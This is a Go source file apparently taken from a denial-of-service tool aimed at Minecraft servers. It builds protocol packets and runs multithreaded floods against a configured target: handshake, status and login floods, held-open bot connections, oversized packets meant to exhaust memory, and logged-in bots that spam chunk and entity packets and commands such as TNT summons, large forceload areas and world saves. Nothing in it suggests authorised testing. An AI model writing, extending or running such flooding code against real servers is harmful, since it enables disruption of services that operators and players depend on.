package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func writeVarInt(w io.Writer, v int32) error {
	u := uint32(v)
	for {
		b := byte(u & 0x7F)
		u >>= 7
		if u != 0 {
			b |= 0x80
		}
		w.Write([]byte{b})
		if u == 0 {
			return nil
		}
	}
}

func writeString(w io.Writer, s string) error {
	writeVarInt(w, int32(len(s)))
	w.Write([]byte(s))
	return nil
}

func framePacket(payload []byte) []byte {
	var out bytes.Buffer
	writeVarInt(&out, int32(len(payload)))
	out.Write(payload)
	return out.Bytes()
}

func buildHandshake(host string, port int, nextState int32, version int) []byte {
	var p bytes.Buffer
	writeVarInt(&p, 0x00)
	writeVarInt(&p, int32(version))
	writeString(&p, host)
	binary.Write(&p, binary.BigEndian, uint16(port))
	writeVarInt(&p, nextState)
	return framePacket(p.Bytes())
}

func buildStatusRequest() []byte {
	var p bytes.Buffer
	writeVarInt(&p, 0x00)
	return framePacket(p.Bytes())
}

func buildLoginStart(username string) []byte {
	var p bytes.Buffer
	writeVarInt(&p, 0x00)
	writeString(&p, username)
	return framePacket(p.Bytes())
}

func buildChatMessage(msg string) []byte {
	var p bytes.Buffer
	writeVarInt(&p, 0x05)
	writeString(&p, msg)
	binary.Write(&p, binary.BigEndian, int64(time.Now().UnixMilli()))
	binary.Write(&p, binary.BigEndian, int64(0))
	writeVarInt(&p, 0)
	p.WriteByte(0)
	return framePacket(p.Bytes())
}

func mcDial(cfg Config) (net.Conn, error) {
	return net.DialTimeout("tcp", cfg.Target+":"+itoa(cfg.Port), 5*time.Second)
}

func mcHandshake(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	pkt := buildHandshake(cfg.Target, cfg.Port, 1, cfg.Version)
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.Write(pkt)
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func mcStatus(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	hs := buildHandshake(cfg.Target, cfg.Port, 1, cfg.Version)
	sr := buildStatusRequest()
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.SetDeadline(time.Now().Add(3 * time.Second))
				c.Write(hs)
				c.Write(sr)
				io.CopyN(io.Discard, c, 1024)
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func mcLogin(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			counter := 0
			for time.Now().Before(stop) {
				user := fmt.Sprintf("mck%d_%d", idx, counter)
				counter++
				if len(user) > 16 {
					user = user[:16]
				}
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.SetDeadline(time.Now().Add(10 * time.Second))
				c.Write(buildHandshake(cfg.Target, cfg.Port, 2, cfg.Version))
				c.Write(buildLoginStart(user))
				time.Sleep(5 * time.Second)
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}(i)
	}
	wg.Wait()
}

func mcBot(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			user := fmt.Sprintf("bot%d", idx)
			for time.Now().Before(stop) {
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					time.Sleep(1 * time.Second)
					continue
				}
				c.Write(buildHandshake(cfg.Target, cfg.Port, 2, cfg.Version))
				c.Write(buildLoginStart(user))
				buf := make([]byte, 4096)
				c.SetReadDeadline(time.Now().Add(cfg.Duration))
				for time.Now().Before(stop) {
					_, err := c.Read(buf)
					if err != nil {
						break
					}
					atomic.AddInt64(&sent, 1)
				}
				c.Close()
			}
		}(i)
	}
	wg.Wait()
}

func mcCompression(cfg Config) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.Write(buildHandshake(cfg.Target, cfg.Port, 1, cfg.Version))
				var p bytes.Buffer
				writeVarInt(&p, 0x00)
				p.Write(make([]byte, cfg.Size))
				c.Write(framePacket(p.Bytes()))
				c.Close()
				atomic.AddInt64(&sent, 1)
			}
		}()
	}
	wg.Wait()
}

func mcLoginAndSend(cfg Config, packetBuilder func() []byte) {
	stop := time.Now().Add(cfg.Duration)
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			user := fmt.Sprintf("bot%d", idx)
			for time.Now().Before(stop) {
				c, err := mcDial(cfg)
				if err != nil {
					atomic.AddInt64(&errors, 1)
					continue
				}
				c.SetDeadline(time.Now().Add(cfg.Duration))
				c.Write(buildHandshake(cfg.Target, cfg.Port, 2, cfg.Version))
				c.Write(buildLoginStart(user))
				time.Sleep(1 * time.Second)
				for time.Now().Before(stop) {
					c.Write(packetBuilder())
					atomic.AddInt64(&sent, 1)
					time.Sleep(10 * time.Millisecond)
				}
				c.Close()
			}
		}(i)
	}
	wg.Wait()
}

func mcChunk(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		var p bytes.Buffer
		writeVarInt(&p, 0x14)
		binary.Write(&p, binary.BigEndian, float64(rand.Intn(1000)))
		binary.Write(&p, binary.BigEndian, float64(0))
		binary.Write(&p, binary.BigEndian, float64(rand.Intn(1000)))
		p.WriteByte(0)
		return framePacket(p.Bytes())
	})
}

func mcEntity(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		var p bytes.Buffer
		writeVarInt(&p, 0x1C)
		writeVarInt(&p, rand.Int31n(1000))
		writeVarInt(&p, 0)
		return framePacket(p.Bytes())
	})
}

func mcCommand(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/help")
	})
}

func mcPlugin(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/plugins")
	})
}

func mcEntitySpam(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/summon armor_stand ~ ~ ~ {Tags:[\"mck\"]}")
	})
}

func mcChunkSpam(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/forceload add ~-512 ~-512 ~512 ~512")
	})
}

func mcRedstone(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/setblock ~ ~ ~ redstone_wire")
	})
}

func mcHopper(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/setblock ~ ~ ~ hopper")
	})
}

func mcTNT(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/summon tnt ~ ~ ~ {fuse:20}")
	})
}

func mcWorldSave(cfg Config) {
	mcLoginAndSend(cfg, func() []byte {
		return buildChatMessage("/save-all")
	})
}

func mcMemory(cfg Config) {
	mcCompression(cfg)
}

func mcCPU(cfg Config) {
	var wg sync.WaitGroup
	copyCfg := cfg
	copyCfg.Threads = cfg.Threads / 3
	if copyCfg.Threads < 1 {
		copyCfg.Threads = 1
	}
	wg.Add(3)
	go func() { defer wg.Done(); mcHandshake(copyCfg) }()
	go func() { defer wg.Done(); mcStatus(copyCfg) }()
	go func() { defer wg.Done(); mcLogin(copyCfg) }()
	wg.Wait()
}
